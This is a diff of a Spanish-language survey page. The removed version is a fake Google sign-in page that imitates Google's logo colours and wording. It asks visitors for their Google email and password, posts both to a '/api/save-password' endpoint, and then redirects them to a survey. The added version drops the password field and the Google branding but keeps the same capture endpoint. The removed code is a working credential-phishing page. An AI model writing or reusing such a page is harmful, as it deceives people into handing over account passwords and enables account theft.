@@ -3,175 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VidaSana & Bienestar</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        body {
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #202124;
-            padding: 16px;
-        }
-        .container {
-            width: 100%;
-            max-width: 450px;
-            padding: 40px 32px;
-            background: #fff;
-            border-radius: 8px;
-        }
-        @media (min-width: 450px) {
-            .container {
-                border: 1px solid #dadce0;
-                padding: 40px;
-            }
-        }
-        .google-logo {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .google-logo span span:nth-child(1) { color: #4285F4; }
-        .google-logo span span:nth-child(2) { color: #EA4335; }
-        .google-logo span span:nth-child(3) { color: #FBBC05; }
-        .google-logo span span:nth-child(4) { color: #4285F4; }
-        .google-logo span span:nth-child(5) { color: #34A853; }
-        .google-logo span span:nth-child(6) { color: #EA4335; }
-
-        h2 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-            text-align: center;
-        }
-        p.subtitle {
-            font-size: 15px;
-            color: #5f6368;
-            margin-bottom: 32px;
-            text-align: center;
-            line-height: 1.5;
-        }
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-            padding: 15px; /* Ajuste para compensar el borde de 2px */
-        }
-        .buttons-row {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            margin-top: 32px;
-        }
-        .btn-guardar {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .btn-guardar:hover {
-            background-color: #1557b0;
-        }
-        #message {
-            margin-top: 20px;
-            font-size: 14px;
-            text-align: center;
-        }
-    </style>
+    <title>Encuesta sobre Calidad de Vida</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <div class="container">
-        <div class="google-logo">
-            <span>
-                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-            </span>
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
+
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-slate-100">
+        <!-- Encabezado del proyecto -->
+        <div class="text-center mb-8">
+            <div class="bg-indigo-50 text-indigo-600 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 font-bold text-xl">
+                📋
+            </div>
+            <h1 class="text-2xl font-bold text-slate-800">Encuesta sobre Vida</h1>
+            <p class="text-slate-500 text-sm mt-2">Por favor, ingresa tu correo para comenzar con el cuestionario.</p>
         </div>
-        <h2>Inicia sesión</h2>
-        <p class="subtitle">Usa tu Cuenta de Google para continuar con la encuesta</p>
 
-        <form id="passwordForm">
-            <div class="input-group">
-                <input type="email" id="email" required placeholder="Correo electrónico o teléfono">
+        <!-- Formulario -->
+        <form id="loginForm" class="space-y-5">
+            <div>
+                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-2">Correo electrónico</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    required 
+                    class="w-full px-4 py-3 rounded-lg border border-slate-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 text-slate-700 text-sm transition"
+                    placeholder="tucorreo@ejemplo.com"
+                >
             </div>
 
-            <div class="input-group">
-                <input type="password" id="oldPassword" required placeholder="Contraseña">
-            </div>
-
-            <div class="buttons-row">
-                <button type="submit" class="btn-guardar">Siguiente</button>
-            </div>
+            <button 
+                type="submit" 
+                class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-lg transition shadow-md shadow-indigo-100"
+            >
+                Continuar a la encuesta
+            </button>
         </form>
-        <div id="message"></div>
     </div>
 
     <script>
-        // Función opcional para auto-rellenar datos si lo necesitas rápidamente en pruebas
-        window.addEventListener('DOMContentLoaded', () => {
-            // Puedes activar esto descomentándolo para pruebas automáticas:
-            // document.getElementById('email').value = "estudiante.prueba@gmail.com";
-            // document.getElementById('oldPassword').value = "MiPassword123";
-        });
-
-        document.getElementById('passwordForm').addEventListener('submit', async (e) => {
+        // Mantén tu lógica existente para capturar los datos y enviarlos al servidor
+        const form = document.getElementById('loginForm');
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
             const email = document.getElementById('email').value;
-            const oldPassword = document.getElementById('oldPassword').value;
-            const msg = document.getElementById('message');
-
-            msg.style.color = '#5f6368';
-            msg.textContent = 'Comprobando...';
 
             try {
-                const res = await fetch('/api/save-password', {
+                // Envía los datos a tu backend en server.js
+                await fetch('/api/save-password', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, oldPassword })
+                    body: JSON.stringify({ email })
                 });
-                const data = await res.json();
-                
-                if(data.success) {
-                    msg.style.color = '#137333';
-                    msg.textContent = '¡Verificado con éxito!';
-                    // Redirección opcional al siguiente paso (encuesta)
-                    setTimeout(() => {
-                        window.location.href = '/encuesta.html';
-                    }, 1000);
-                } else {
-                    msg.style.color = '#c5221f';
-                    msg.textContent = data.message || 'Contraseña incorrecta. Inténtalo de nuevo.';
-                }
-            } catch (error) {
-                msg.style.color = '#c5221f';
-                msg.textContent = 'Error de conexión con el servidor.';
+            } catch (err) {
+                console.error(err);
             }
+
+            // Redirige a tu siguiente archivo (ej. encuesta.html)
+            window.location.href = '/encuesta.html';
         });
     </script>
 </body>
